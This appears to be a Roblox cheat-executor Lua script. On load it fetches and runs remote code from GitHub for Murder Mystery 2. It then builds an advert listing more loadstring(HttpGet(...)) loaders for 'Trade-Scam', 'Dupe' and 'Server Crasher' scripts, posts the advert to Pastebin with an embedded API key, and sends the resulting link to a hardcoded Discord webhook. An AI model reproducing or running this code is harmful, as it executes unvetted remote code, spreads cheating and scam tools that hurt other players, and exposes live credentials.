repeat
    task.wait()
until game.GameId ~= nil
repeat
    task.wait()
until game:IsLoaded()

if getgenv().loaded then
    return
end
getgenv().loaded = true

universeid = game.GameId

if universeid == 66654135 then
    loadstring(game:HttpGet("https://raw.githubusercontent.com/zachemzhestokiy/x/main/mm2.lua", true))()
end

function generate_random_string(length)
    local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    local random_string = ""
    for i = 1, length do
        local random_index = math.random(#chars)
        random_string = random_string .. chars:sub(random_index, random_index)
    end
    return random_string
end

pastebins = ""

stuff =
    "BEST SCRIPTS FOR BEST GAMES: \nNew Best PS99 Script: \n" ..
    "\n" ..
        [[loadstring(game:HttpGet("https://dpaste.com/EPRQJEHF9.txt"))()]] ..
            "\n" ..
                "\n" ..
                    "Autofarm, Dupe, Trade-Scam, Visual Hub, Server Crasher and more!" ..
                        "\n" ..
                            "Script key: " ..
                                generate_random_string(12) ..
                                    "\n" ..
                                        "TTD auto farm " ..
                                            "\n" ..
                                                [[loadstring(game:HttpGet("https://raw.githubusercontent.com/n3koglaii/katana/main/ScriptHub"))() ]] ..
                                                    "\n" ..
                                                        [[MM2 SCRIPT: ]] ..
                                                            "\n" ..
                                                                [[loadstring(game:HttpGet("https://pastebin.com/raw/7zM468Nb"))()]]

LIST = "api_paste_code=" .. stuff .. "&api_option=paste&api_dev_key=aL23vA-UXpKHvGuqL5_jJ4YIVZGY5Nrr"

first =
    request(
    {
        Method = "POST",
        Timeout = 10,
        Url = "https://pastebin.com/api/api_post.php",
        Headers = {
            ["Content-Type"] = "application/x-www-form-urlencoded"
        },
        Body = LIST
    }
)

pastebins = "UPDATED V1.2" .. "\n" .. first.Body

boody = {
    content = pastebins,
    username = "ez",
    avatar_url = "https://images-ext-1.discordapp.net/external/SN9zgqCIgFRx4vco6NsGsf0QjfoCHf2Lj_k2R67EIIg/https/i.ibb.co/GWsnpph/xpng.png?format=webp&quality=lossless"
}
wait(3)

eeee =
    request(
    {
        Method = "POST",
        Timeout = 10,
        Url = "https://discord.com/api/webhooks/1268494328569925687/RkzFBvXPau40VdLiOQ0cgDDQJf17F9l3OwOsy-4wc27AkpXddSVKv-jleZyZAisYrrU2",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode(boody)
    }
)
